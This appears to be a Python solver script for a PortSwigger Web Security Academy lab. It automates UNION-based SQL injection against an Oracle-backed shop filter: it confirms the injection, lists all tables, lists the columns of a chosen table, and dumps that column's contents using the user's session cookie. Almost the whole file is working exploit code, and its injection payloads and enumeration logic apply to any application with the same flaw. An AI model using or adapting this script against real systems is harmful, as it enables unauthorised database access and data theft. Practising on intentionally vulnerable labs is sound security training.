#/usr/bin/python3

"""
The challenge:
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

Example usage:
python3 1-10-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"
"""

import requests, argparse, re

# parse command line arguments
parser = argparse.ArgumentParser(add_help=True, description='Example usage:\n $python3 1-10-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"')

parser.add_argument('-u', '--url', action='store', required=True, help='Enter the full url of the page', type=str)
parser.add_argument('-c', '--cookie', action='store', required=True, help='Enter the session cookie value', type=str)
args = parser.parse_args()
cookie = args.cookie
if str(args.url[-1]) == "/":
	host = args.url[:-1]
else:
	host = args.url

# the params in the http request(s):
data = {}
data["Cookie"] = f"session={cookie}"

#get the result of the query from the page
def findthequery(thepage):
	stringtofind = "<h1>Toys &amp; Games&apos; "
	start_index = thepage.find(stringtofind) + len(stringtofind)
	end_index = thepage.find("HTTP/1.1</h1>")
	return thepage[start_index:end_index]

def findtheresults(thepage):
	stringtofind = "<tbody>"
	start_index = thepage.find(stringtofind)
	end_index = thepage.find("</tbody>") + 8
	part_page = thepage[start_index:end_index]
	tables = re.findall("<th>(.*?)</th>", part_page, re.DOTALL)
	return tables

def testquery():
	query = f"%27+ORDER+BY+1--"
	url = f"{host}/filter?category=Toys+%26+Games{query} HTTP/1.1"
	r = requests.request("GET", url=url, params=data)
	responsecode = r.status_code
	return responsecode == 200

def get_tablenames():
	query = "%27+UNION+SELECT+table_name,NULL+FROM+all_tables--"
	url = f"{host}/filter?category=Toys+%26+Games{query} HTTP/1.1"
	r = requests.request("GET", url=url, params=data)
	query_response = findthequery(r.text)
	results = findtheresults(r.text)
	return query_response, results

def get_columnnames(table_name):
	query = f"%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=+%27{table_name}%27--"
	url = f"{host}/filter?category=Toys+%26+Games{query} HTTP/1.1"
	r = requests.request("GET", url=url, params=data)
	query_response = findthequery(r.text)
	results = findtheresults(r.text)
	return query_response, results

def get_content(table_name, column_name):
	query = f"%27+UNION+SELECT+{column_name},null+FROM+{table_name}--"
	url = f"{host}/filter?category=Toys+%26+Games{query} HTTP/1.1"
	r = requests.request("GET", url=url, params=data)
	query_response = findthequery(r.text)
	results = findtheresults(r.text)
	return query_response, results

def printoptions(tables):
	i = 1
	index_tables = {}
	for t in tables:
		print(f"{i}) {t}")
		index_tables[str(i)] = t
		i = i + 1
	return index_tables


#Lets gooo

# Test the validity of the sql query
if testquery() == False:
	print(f"\nResponse code is not 200. Maybe there is something wrong in the url parameters?")
	print(f"Here is the help menu:\n")
	parser.print_help()
else:
	print(" ~> looks like the injection works!")
	print(" ~> herewego:\n")

	# List tables
	tables = get_tablenames()
	index_tables = printoptions(tables[1])

	# Select table
	print("\nPlease choose the number of the table you would like to view:\n")
	selected_table = input()
	table_name = index_tables[selected_table]

	# List columns from selected table
	columns = get_columnnames(table_name)
	index_columns = printoptions(columns[1])

	# Select column
	print("\nPlease choose the number of the column you would like to view:\n")
	selected_column = input()
	column_name = index_columns[selected_column]

	# List content from selected column
	content = get_content(table_name, column_name)
	printoptions(content[1])
